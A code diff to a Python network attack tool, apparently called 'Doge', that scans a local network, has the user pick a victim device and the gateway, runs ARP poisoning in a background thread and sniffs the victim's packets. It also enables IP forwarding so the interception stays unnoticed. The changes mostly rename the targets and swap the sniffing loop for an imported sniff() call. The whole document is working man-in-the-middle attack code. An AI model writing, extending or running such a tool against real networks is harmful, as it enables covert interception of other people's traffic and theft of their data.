@@ -9,6 +9,7 @@ from tabulate import tabulate
 from colorama import init, Fore, Back
 from time import sleep
 import threading
+from sniffer import sniff
 
 init()
 
@@ -124,36 +125,36 @@ def get_targets(device_list):
 
     target_list = [f"[{i}] {ip}" for i,ip in enumerate(ip_list)]
     target_list.append("[q] Quit")
-    target1_menu = TerminalMenu(target_list, title="Choose a Device as Target 1:")
-    target1 = target1_menu.show()
+    target_menu = TerminalMenu(target_list, title="Select the Target Device IP:")
+    target = target_menu.show()
 
     try:
-        target1 = {'IP': ip_list[target1], 'MAC': mac_list[target1]}
+        target = {'IP': ip_list[target], 'MAC': mac_list[target]}
     except IndexError:
         os.system("clear")
         exit(0)
 
-    print(f"Target 1: {target1['IP']}")
+    print(f"Target: {target['IP']}")
     
-    ip_list = list(filter(lambda x: x!= target1['IP'], ip_list))
-    mac_list = list(filter(lambda x: x!= target1['MAC'], mac_list))
+    ip_list = list(filter(lambda x: x!= target['IP'], ip_list))
+    mac_list = list(filter(lambda x: x!= target['MAC'], mac_list))
 
-    target_list = [f"[{i}] {ip}" for i,ip in enumerate(ip_list)]
-    target_list.append("[q] Quit")
-    target2_menu = TerminalMenu(target_list, title="Choose a Device as Target 2:")
-    target2 = target2_menu.show()
+    gateway_list = [f"[{i}] {ip}" for i,ip in enumerate(ip_list)]
+    gateway_list.append("[q] Quit")
+    gateway_menu = TerminalMenu(gateway_list, title="Select the Gateway IP:")
+    gateway = gateway_menu.show()
     
     try:
-        target2 = {'IP': ip_list[target2], 'MAC': mac_list[target2]}
+        gateway = {'IP': ip_list[gateway], 'MAC': mac_list[gateway]}
     except IndexError:
         os.system("clear")
         exit(0)
     
-    print(f"Target 2: {target2['IP']}")
+    print(f"Gateway: {gateway['IP']}")
     print()
-    print(f"Ready to perform ARP Poisoning between {target1['IP']} and {target2['IP']}")
+    print(f"Ready to perform ARP Poisoning between {target['IP']} and {gateway['IP']}")
 
-    return target1, target2
+    return target, gateway
     
 def arp_poison(target1, target2):
     print("Enabling IP-Forwarding, So Doge is Inconspicuous...")
@@ -185,21 +186,18 @@ def main():
     adapter = adapter_selection()
     ip, mac, netmask, scan_range = get_adapter_info(adapter)
     ip_list = get_devices(scan_range)
-    target1, target2 = get_targets(ip_list)
+    target, gateway = get_targets(ip_list)
 
     input("Hit Enter to Get Started...")
     os.system("clear")
     # Big booty multi-threading
-    arp_thread = threading.Thread(target=arp_poison, args=(target1,target2,))
+    arp_thread = threading.Thread(target=arp_poison, args=(target, gateway,))
     arp_thread.start()
 
-    try:
-        while True:
-            sniff_packets()
-    except KeyboardInterrupt:
-        print("Stopping Main Thread")
-        arp_thread.stop = True
-        arp_thread.join()
+    packets = sniff(target['IP'], [1])
+    print("Stopping Main Threa1d")
+    arp_thread.stop = True
+    arp_thread.join()
 
     
 if __name__=="__main__":
